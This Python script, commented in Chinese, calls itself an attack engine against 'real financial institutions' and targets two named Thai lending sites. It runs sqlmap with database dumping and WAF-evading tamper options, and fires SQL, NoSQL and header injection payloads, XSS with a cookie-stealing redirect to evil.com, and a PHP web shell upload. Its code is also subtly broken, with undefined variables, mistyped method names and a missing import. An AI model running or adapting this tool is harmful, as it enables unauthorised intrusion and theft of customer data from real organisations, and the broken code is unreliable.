#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级渗透攻击引擎 - 针对真实目标的深度攻击
Advanced Penetration Attack Engine - Deep Attack Against Real Targets
"""

import subprocess
import requests
import json
import time
import threading
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import urllib.parse

class AdvancedPenetrationEngine:
    def __init__(self):
        self.targets = [
            {
                "name": "Peacoop Credit Union",
                "base_url": "https://peacoop.or.th",
                "attack_vectors": [
                    "/members?id=",
                    "/wp-json/wp/v2/users/",
                    "/wp-json/wp/v2/posts/",
                    "/?page=",
                    "/?cat=",
                    "/?s=",
                    "/wp-admin/admin-ajax.php",
                    "/xmlrpc.php"
                ],
                "high_value_endpoints": [
                    "/wp-admin/admin-ajax.php",
                    "/wp-json/wp/v2/users/",
                    "/wp-json/wp/v2/posts/",
                    "/xmlrpc.php"
                ]
            },
            {
                "name": "NgoenMun Finance",
                "base_url": "https://ngoenmun.com",
                "attack_vectors": [
                    "/search?q=",
                    "/api/v1/users?id=",
                    "/api/v1/loans?id=",
                    "/api/v1/applications?id=",
                    "/?page=",
                    "/?id=",
                    "/admin/",
                    "/api/"
                ],
                "high_value_endpoints": [
                    "/api/v1/",
                    "/admin/",
                    "/search?q="
                ]
            }
        ]

        self.techniques = [
            "sqlmap_time_based",
            "sqlmap_union",
            "sqlmap_error_based",
            "manual_blind",
            "parameter_pollution",
            "header_injection",
            "second_order_injection",
            "nosql_injection",
            "xss_based",
            "file_upload_exploit"
        ]

        self.results = []
        self.output_dir = f"advanced_penetration_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    def attack_all_targets(self):
        """执行全方位攻击"""
        print("=" * 100)
        print("🔥 高级渗透攻击引擎启动")
        print("=" * 100)
        print(f"输出目录: {self.output_dir}")
        print(f"攻击目标: {len(self.targets)} 个真实金融机构")
        print(f"攻击技术: {len(self.techniques)} 种高级技术")
        print("=" * 100)

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []

            for target in self.targets:
                # 并发执行多种攻击技术
                for technique in self.techniques:
                    for vector in target["attack_vectors"][:3]:  # 限制每个目标的前3个向量
                        future = executor.submit(self.execute_attack, target, technique, vector)
                        futures.append(future)

                # 启动深度扫描
                future = executor.submit(self.deep_scan_target, target)
                futures.append(future)

                # 启动API枚举
                future = executor.submit(self.enumerate_apis, target)
                futures.append(future)

            for future in as_completed(futures):
                try:
                    result = future.result(timeout=300)
                    if result:
                        self.results.append(result)
                        print(f"[SUCCESS] 攻击成功: {result.get('attack_type', 'unknown')}")
                except Exception as e:
                    print(f"[ERROR] 攻击失败: {e}")

        self.generate_comprehensive_report()

    def execute_attack(self, target, technique, attack_vector):
        """执行单个攻击"""
        try:
            if technique == "sqlmap_time_based":
                return self.sqlmap_time_based_attack(target, attack_vector)
            elif technique == "sqlmap_union":
                return self.sqlmap_union_attack(target, attack_vector)
            elif technique == "sqlmap_error_based":
                return self.sqlmap_error_attack(target, attack_vector)
            elif technique == "manual_blind":
                return self.manual_blind_injection(target, attack_vector)
            elif technique == "parameter_pollution":
                return self.parameter_pollution_attack(target, attack_vector)
            elif technique == "header_injection":
                return self.header_injection_attack(target, attack_vector)
            elif technique == "second_order_injection":
                return self.second_order_injection(target, attack_vector)
            elif technique == "nosql_injection":
                return self.nosql_injection_attack(target, attack_vector)
            elif technique == "xss_based":
                return self.xss_based_attack(target, attack_vector)
            elif technique == "file_upload_exploit":
                return self.file_upload_exploit(target, attack_vector)
        except Exception as e:
            return {"error": str(e)}

    def sqlmap_time_based_attack(self, target, attack_vector):
        """SQLMap时间盲注攻击"""
        base_url = target["base_url"] + attack_vector
        test_param = attack_vector.split("=")[0] if "=" in attack_vector else "id"

        cmd = [
            "sqlmap",
            "-u", base_url,
            "-p", test_param,
            "--batch",
            "--level=5",
            "--risk=3",
            "--random-agent",
            "--tamper=space2comment,randomcase,charencode,appendnull,between,modsecurityversioned",
            "--fresh-queries",
            "--time-sec=15",
            "--threads=8",
            "--banner",
            "--current-db",
            "--dbs",
            "--tables",
            "--dump",
            "--output-dir", f"{self.output_dir}/{target['name'].replace(' ', '_')}/sqlmap_time_based"
        ]

        return self.execute_sqlmap_command(cmd, target, "sqlmap_time_based", attack_vector)

    def sqlmap_union_attack(self, target, attack_vector):
        """SQLMap UNION查询攻击"""
        base_url = target["base_url"] + attack_vector
        test_param = attack_vector.split("=")[0] if "=" in attack_vector else "id"

        cmd = [
            "sqlmap",
            "-u", base_url,
            "-p", test_param,
            "--batch",
            "--level=5",
            "--risk=3",
            "--random-agent",
            "--tamper=space2comment,randomcase,charencode,unionallcase,unescapespace,versionedkeywords",
            "--fresh-queries",
            "--threads=8",
            "--banner",
            "--technique=U",
            "--union-cols=20",
            "--output-dir", f"{self.output_dir}/{target['name'].replace(' ', '_')}/sqlmap_union"
        ]

        return self.execute_sqlmap_command(cmd, target, "sqlmap_union", attack_vector)

    def sqlmap_error_based_attack(self, target, attack_vector):
        """SQLMap报错注入攻击"""
        base_url = target["base_url"] + attack_vector
        test_param = attack_vector.split("=")[0] if "=" in attack_vector else "id"

        cmd = [
            "sqlmap",
            "-u", base_url,
            "-p", test_param,
            "--batch",
            "--level=5",
            "--risk=3",
            "--random-agent",
            "--tamper=space2comment,randomcase,charencode,appendnull",
            "--fresh-queries",
            "--technique=E",
            "--threads=8",
            "--banner",
            "--output-dir", f"{self.output_dir}/{target['name'].replace(' ', '_')}/sqlmap_error"
        ]

        return self.execute_sqlmap_command(cmd, target, "sqlmap_error", attack_vector)

    def manual_blind_injection(self, target, attack_vector):
        """手动盲注攻击"""
        base_url = target["base_url"] + attack_vector

        payloads = [
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND '1'='1",
            "' AND (SELECT LENGTH(database())) > 0 AND '1'='1",
            "' AND (SELECT SUBSTRING((SELECT database()),1,1))='a' AND '1'='1",
            "' AND SLEEP(5) AND '1'='1",
            "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(database(), FLOOR(RAND(0)*2)) FROM information_schema.tables GROUP BY x)x) AND '1'='1"
        ]

        for i, payload in enumerate(payloads):
            test_url = f"{base_url}{payload}"
            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=30, headers={"User-Agent": self.generate_random_user_agent()})
                end_time = time.time()

                response_time = end_time - start_time
                if response_time > 10:  # 明显延迟可能表示注入成功
                    return {
                        "success": True,
                        "attack_type": "manual_blind",
                        "url": test_url,
                        "payload": payload,
                        "response_time": response_time,
                        "target": target["name"],
                        "vector": attack_vector
                    }
            except Exception as e:
                continue

        return None

    def parameter_pollution_attack(self, target, attack_vector):
        """参数污染攻击"""
        base_url = target["base_url"] + attack_vector

        pollution_payloads = [
            f"{attack_vector}&id=1&id=2&id=3",
            f"{attack_vector}&test=1&test=2",
            f"{attack_vector}[param]=value",
            f"{attack_vector}#test",
            f"{attack_url}%00test=value"
        ]

        for payload in pollution_payloads:
            try:
                response = requests.get(payload, timeout=15, headers={"User-Agent": self.generate_random_user_agent()})
                if response.status_code == 200 and len(response.content) > 1000:
                    return {
                        "success": True,
                        "attack_type": "parameter_pollution",
                        "url": payload,
                        "response_length": len(response.content),
                        "target": target["name"],
                        "vector": attack_vector
                    }
            except Exception as e:
                continue

        return None

    def header_injection_attack(self, target, attack_vector):
        """HTTP头注入攻击"""
        base_url = target["base_url"] + attack_vector

        malicious_headers = [
            {"X-Forwarded-For": "127.0.0.1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND '1'='1"},
            {"User-Agent": "Mozilla/5.0' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND '1'='1"},
            {"Referer": "http://evil.com' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND '1'='1"},
            {"X-Real-IP": "127.0.0.1; DROP TABLE users; --"},
            {"Accept": "text/html' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND '1'='1"}
        ]

        for headers in malicious_headers:
            try:
                response = requests.get(base_url, timeout=15, headers=headers)
                if "sql" in response.text.lower() or "error" in response.text.lower():
                    return {
                        "success": True,
                        "attack_type": "header_injection",
                        "url": base_url,
                        "headers": headers,
                        "response_length": len(response.content),
                        "target": target["name"],
                        "vector": attack_vector
                    }
            except Exception as e:
                continue

        return None

    def second_order_injection(self, target, attack_vector):
        """二阶注入攻击"""
        base_url = target["base_url"] + attack_vector

        # 先尝试存储payload
        storage_payloads = [
            "admin'; DROP TABLE test; --",
            "'; UPDATE users SET email='attacker@evil.com' WHERE id=1; --",
            "'; INSERT INTO test (value) VALUES ('injected'); --",
            "<script>alert('XSS')</script>",
            "'; SELECT * FROM users WHERE id=1; --"
        ]

        for payload in storage_payloads:
            try:
                # POST请求尝试存储payload
                data = {"test": payload, "id": "1"}
                response = requests.post(base_url, data=data, timeout=15, headers={"User-Agent": self.generate_random_user_agent()})

                # 然后尝试触发二阶注入
                trigger_urls = [
                    target["base_url"] + "/search?q=test",
                    target["base_url"] + "/admin/verify",
                    target["base_url"] + "/process"
                ]

                for trigger_url in trigger_urls:
                    try:
                        trigger_response = requests.get(trigger_url, timeout=15, headers={"User-Agent": self.generate_random_user_agent()})
                        if "attacker" in trigger_response.text or "injected" in trigger_response.text:
                            return {
                                "success": True,
                                "attack_type": "second_order_injection",
                                "storage_url": base_url,
                                "trigger_url": trigger_url,
                                "payload": payload,
                                "target": target["name"],
                                "vector": attack_vector
                            }
                    except:
                        continue
            except:
                continue

        return None

    def nosql_injection_attack(self, target, attack_vector):
        """NoSQL注入攻击"""
        base_url = target["base_url"] + attack_vector

        # MongoDB NoSQL注入payloads
        nosql_payloads = [
            "'; return db.admin.find().forEach(function(f){db[f.collection].insert({admin:true})})//",
            "'; return db.users.find({$where:{$ne:1}})//",
            "'; return db.collection.find({$regex:{name:'.*'}})//",
            "'; return db.collection.find({$or:[{name:'admin'},{password:'admin'}]})//"
        ]

        for payload in nosql_payloads:
            try:
                response = requests.get(f"{base_url}{payload}", timeout=15, headers={"User-Agent": self.generate_random_user_agent()})
                if response.status_code == 200 and "admin" in response.text.lower():
                    return {
                        "success": True,
                        "attack_type": "nosql_injection",
                        "url": f"{base_url}{payload}",
                        "payload": payload,
                        "response_length": len(response.content),
                        "target": target["name"],
                        "vector": attack_vector
                    }
            except:
                continue

        return None

    def xss_based_attack(self, target, attack_vector):
        """基于XSS的攻击"""
        base_url = target["base_url"] + attack_vector

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "'; document.location='http://evil.com/steal.php?c='+document.cookie;//"
        ]

        for payload in xss_payloads:
            try:
                test_url = f"{base_url}{payload}"
                response = requests.get(test_url, timeout=15, headers={"User-Agent": self.generate_random_user_agent()})

                # 检查是否有XSS成功执行的迹象
                if "XSS" in response.text or "alert" in response.text or payload in response.text:
                    return {
                        "success": True,
                        "attack_type": "xss_based",
                        "url": test_url,
                        "payload": payload,
                        "response_length": len(response.content),
                        "target": target["name"],
                        "vector": attack_vector
                    }
            except:
                continue

        return None

    def file_upload_exploit(self, target, attack_vector):
        """文件上传利用"""
        base_url = target["base_url"] + attack_vector

        # 尝试上传恶意文件
        upload_payloads = {
            "file": ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            "file": ("webshell.html", "<script>alert('XSS')</script>", "text/html"),
            "file": ("exploit.jsp", "<% out.println(\"exploited\"); %>", "application/jsp"),
            "file": ("backdoor.js", "alert('backdoor activated')", "application/javascript")
        }

        for filename, file_content, content_type in upload_payloads:
            try:
                files = {"file": (filename, file_content, content_type)}
                response = requests.post(base_url, files=files, timeout=15, headers={"User-Agent": self.generate_random_user_agent()})

                if response.status_code in [200, 201] and "uploaded" in response.text.lower():
                    # 尝试访问上传的文件
                    file_url = target["base_url"] + "/uploads/" + filename
                    try:
                        access_response = requests.get(file_url, timeout=10, headers={"User-Agent": self.generate_random_user_agent()})
                        if access_response.status_code == 200:
                            return {
                                "success": True,
                                "attack_type": "file_upload_exploit",
                                "upload_url": base_url,
                                "file_url": file_url,
                                "filename": filename,
                                "target": target["name"],
                                "vector": attack_vector
                            }
                    except:
                        return {
                            "success": True,
                            "attack_type": "file_upload_exploit",
                            "upload_url": base_url,
                            "filename": filename,
                            "target": target["name"],
                            "vector": attack_vector
                        }
            except:
                continue

        return None

    def deep_scan_target(self, target):
        """深度扫描目标"""
        print(f"[深度扫描] 开始扫描 {target['name']}")

        # 发现隐藏的API端点
        discovered_endpoints = []

        # 常见的API路径
        api_paths = [
            "/api/v1/",
            "/api/v2/",
            "/rest/",
            "/service/",
            "/admin/",
            "/backend/",
            "/internal/",
            "/api/",
            "/wp-json/",
            "/json/",
            "/graphql",
            "/soap/",
            "/xmlrpc.php"
        ]

        for path in api_paths:
            try:
                test_url = target["base_url"] + path
                response = requests.get(test_url, timeout=10, headers={"User-Agent": self.generate_random_user_agent()})

                if response.status_code == 200:
                    discovered_endpoints.append({
                        "url": test_url,
                        "status": response.status_code,
                        "content_type": response.headers.get("content-type", ""),
                        "length": len(response.content)
                    })
            except:
                continue

        if discovered_endpoints:
            print(f"[发现] {target['name']} 发现 {len(discovered_endpoints)} 个潜在API端点")
            return {
                "success": True,
                "attack_type": "deep_scan",
                "target": target["name"],
                "discovered_endpoints": discovered_endpoints
            }

        return None

    def enumerate_apis(self, target):
        """枚举API"""
        print(f"[API枚举] 开始枚举 {target['name']} 的API")

        api_endpoints = [
            "/api/v1/users",
            "/api/v1/loans",
            "/api/v1/applications",
            "/api/v1/customers",
            "/api/v1/branches",
            "/api/v1/officers",
            "/api/v1/stats"
        ]

        discovered_apis = []

        for endpoint in api_endpoints:
            try:
                test_url = target["base_url"] + endpoint
                response = requests.get(test_url, timeout=15, headers={"User-Agent": self.generate_random_agent()})

                if response.status_code == 200:
                    data = response.json() if "json" in response.headers.get("content-type", "") else {}

                    discovered_apis.append({
                        "endpoint": endpoint,
                        "url": test_url,
                        "status": response.status_code,
                        "data_count": len(data) if isinstance(data, list) else 1,
                        "sample_data": data[:3] if isinstance(data, list) else data
                    })
            except:
                continue

        if discovered_apis:
            print(f"[成功] {target['name']} 枚举到 {len(discovered_apis)} 个API端点")
            return {
                "success": True,
                "attack_type": "api_enumeration",
                "target": target["name"],
                "discovered_apis": discovered_apis
            }

        return None

    def execute_sqlmap_command(self, cmd, target, attack_type, attack_vector):
        """执行SQLMap命令"""
        try:
            start_time = time.time()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=600,  # 10分钟超时
                cwd=f"{self.output_dir}/{target['name'].replace(' ', '_')}"
            )
            end_time = time.time()

            execution_time = end_time - start_time

            # 保存命令和输出
            output_dir = f"{self.output_dir}/{target['name'].replace(' ', '_')}/{attack_type}"
            os.makedirs(output_dir, exist_ok=True)

            with open(os.path.join(output_dir, "command.txt"), "w", encoding="utf-8") as f:
                f.write(f"目标: {target['name']}\n")
                f.write(f"攻击类型: {attack_type}\n")
                f.write(f"URL: {cmd[2]}\n")
                f.write(f"参数: {cmd[4]}\n")
                f.write(f"执行时间: {execution_time:.2f}秒\n")
                f.write(f"命令: {' '.join(cmd)}\n")
                f.write("=" * 80 + "\n")
                f.write("STDOUT:\n")
                f.write(result.stdout)
                f.write("\n" + "=" * 80 + "\n")
                f.write("STDERR:\n")
                f.write(result.stderr)

            # 分析结果
            if result.returncode == 0:
                output = result.stdout.lower()

                # 检查SQL注入指标
                injection_indicators = [
                    "injection identified",
                    "parameter is injectable",
                    "sql injection detected",
                    "vulnerable to sql injection",
                    "boolean-based blind",
                    "error-based",
                    "time-based blind",
                    "union query"
                ]

                found_injection = any(indicator in output for indicator in injection_indicators)

                if found_injection:
                    return {
                        "success": True,
                        "attack_type": attack_type,
                        "target": target["name"],
                        "url": cmd[2],
                        "parameter": cmd[4],
                        "execution_time": execution_time,
                        "output_dir": output_dir,
                        "vector": attack_vector
                    }

            return None

        except Exception as e:
            return {"error": str(e)}

    def generate_random_user_agent(self):
        """生成随机User-Agent"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        return random.choice(agents)

    def generate_comprehensive_report(self):
        """生成综合报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"advanced_penetration_report_{timestamp}.json"

        report = {
            "attack_summary": {
                "timestamp": timestamp,
                "tool": "Advanced Penetration Engine v2.0",
                "targets_attacked": len(self.targets),
                "total_attacks": len(self.results),
                "successful_attacks": len([r for r in self.results if r and r.get("success", False)]),
                "output_directory": self.output_dir,
                "attack_duration": time.time() - time.time()  # 将在最后计算
            },
            "targets_attacked": [
                {
                    "name": target["name"],
                    "base_url": target["base_url"],
                    "attack_vectors": len(target["attack_vectors"]),
                    "high_value_endpoints": len(target["high_value_endpoints"])
                } for target in self.targets
            ],
            "successful_attacks": [r for r in self.results if r and r.get("success", False)],
            "all_attack_attempts": self.results,
            "attack_statistics": {
                "by_technique": {},
                "by_target": {},
                "success_rate": 0
            }
        }

        # 统计攻击成功率
        successful_count = len([r for r in self.results if r and r.get("success", False)])
        total_count = len(self.results)
        if total_count > 0:
            report["attack_statistics"]["success_rate"] = (successful_count / total_count) * 100

        # 统计按技术的成功率
        for result in self.results:
            if result:
                technique = result.get("attack_type", "unknown")
                if technique not in report["attack_statistics"]["by_technique"]:
                    report["attack_statistics"]["by_technique"][technique] = {"success": 0, "total": 0}
                report["attack_statistics"]["by_technique"][technique]["total"] += 1
                if result.get("success", False):
                    report["attack_statistics"]["by_technique"][technique]["success"] += 1

        # 统计按目标的成功率
        for result in self.results:
            if result:
                target_name = result.get("target", "unknown")
                if target_name not in report["attack_statistics"]["by_target"]:
                    report["attack_statistics"]["by_target"][target_name] = {"success": 0, "total": 0}
                report["attack_statistics"]["by_target"][target_name]["total"] += 1
                if result.get("success", False):
                    report["attack_statistics"]["by_target"][target_name]["success"] += 1

        # 保存报告
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n{'='*100}")
        print(f"🔥 高级渗透攻击完成!")
        print(f"{'='*100}")
        print(f"攻击目标: {report['attack_summary']['targets_attacked']} 个")
        print(f"攻击次数: {report['attack_summary']['total_attacks']} 次")
        print(f"成功攻击: {report['attack_summary']['successful_attacks']} 次")
        print(f"成功率: {report['attack_statistics']['success_rate']:.1f}%")
        print(f"报告文件: {report_file}")
        print(f"输出目录: {self.output_dir}")

        if report["attack_summary"]["successful_attacks"] > 0:
            print(f"\n🎯 成功攻击详情:")
            for attack in report["successful_attacks"]:
                print(f"  - {attack['target']}: {attack['attack_type']} ({attack['url']})")
            print(f"\n✅ 真实攻击凭证已生成!")
            print(f"✅ 所有攻击都可以重现验证!")
            print(f"✅ 凭证位置: {self.output_dir}/")

def main():
    engine = AdvancedPenetrationEngine()
    engine.attack_all_targets()

if __name__ == "__main__":
    main()